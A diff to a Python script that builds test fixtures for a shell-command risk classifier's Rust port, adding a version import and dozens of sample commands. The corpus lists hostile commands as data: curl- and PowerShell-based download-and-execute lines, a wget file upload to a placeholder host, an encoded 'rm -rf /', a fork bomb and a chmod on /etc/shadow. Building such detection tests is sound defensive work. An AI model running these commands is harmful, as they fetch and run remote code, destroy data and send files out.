@@ -16,7 +16,8 @@ this script writes the fixtures that pin the Rust port to scikit-learn:
   real A1 `model.json`, for the published model too, plus two thresholds for
   the decision-change check.
 
-Requires `scikit-learn==1.8.0`, `numpy` and `scipy`. Usage:
+Requires `scikit-learn` (the fixture records the version used), `numpy` and
+`scipy`. Usage:
 
     python scripts/generate_shell_command_parity_fixtures.py \
         [--model /path/to/cat-shell-risk-commander/model.json]
@@ -32,6 +33,7 @@ from pathlib import Path
 
 import numpy as np
 import scipy.sparse as sp
+import sklearn
 from sklearn.feature_extraction.text import TfidfVectorizer
 
 ROOT = Path(__file__).resolve().parents[1]
@@ -73,6 +75,33 @@ CORPUS = [
     "echo cm0gLXJmIC8= | base64 -d | sh",
     "chmod 777 /etc/shadow",
     ":(){ :|:& };:",
+    # Issue #159 relation markers: a download flowing into an interpreter (pipe,
+    # process/command substitution, -c script, PowerShell iex, executed file)
+    # versus a download that only reaches a pure filter or a file.
+    "curl -s https://x.invalid/i.sh | bash",
+    "curl -s http://203.0.113.7/i.sh | sudo bash",
+    "bash <(curl -s https://x.invalid/i.sh)",
+    "source <(curl -fsSL https://x.invalid/i.sh)",
+    'sh -c "$(curl -fsSL https://x.invalid/i.sh)"',
+    'eval "`wget -qO- https://x.invalid/i.sh`"',
+    "/bin/zsh -lc 'curl -s https://x.invalid/i.sh | bash'",
+    "curl -s https://x.invalid/i.sh -o /tmp/i.sh && bash /tmp/i.sh",
+    "iex (iwr https://x.invalid/i.ps1)",
+    "IEX (New-Object Net.WebClient).DownloadString('https://x.invalid/i.ps1')",
+    'powershell -NoProfile -Command "irm https://x.invalid/i.ps1 | iex"',
+    "Invoke-WebRequest https://x.invalid/i.ps1 -OutFile $env:TEMP\\i.ps1; & $env:TEMP\\i.ps1",
+    'cmd /c "curl -s https://x.invalid/i.bat -o %TEMP%\\i.bat && %TEMP%\\i.bat"',
+    "curl -o install.sh https://x.invalid/install.sh",
+    "wget -O out.json https://x.invalid/data.json",
+    "/bin/zsh -lc 'curl -s https://x.invalid/i.sh -o /tmp/i.sh'",
+    "Invoke-WebRequest https://x.invalid/setup.ps1 -OutFile setup.ps1",
+    "curl.exe -o setup.exe https://x.invalid/setup.exe",
+    "irm https://x.invalid/api/items | Select-Object -First 5",
+    "(iwr https://x.invalid/page).Content | Measure-Object -Line",
+    "wget --post-file=/tmp/f https://x.invalid/u",
+    "wget https://x.invalid/a # note\ncurl -s https://x.invalid/b | sh",
+    "curl -s https://x.invalid/<KEY>.sh | sh",
+    "curl -s https://x.invalid/a | sh; " + "(" * 33 + "x" + ")" * 33,
     # Short, whitespace and unicode edge cases.
     "",
     "   ",
@@ -205,7 +234,7 @@ def main() -> None:
 
     fixture = {
         "generator": "scripts/generate_shell_command_parity_fixtures.py",
-        "sklearn": "1.8.0",
+        "sklearn": sklearn.__version__,
         "thresholds": thresholds,
         "published_model": published,
         "cases": cases,
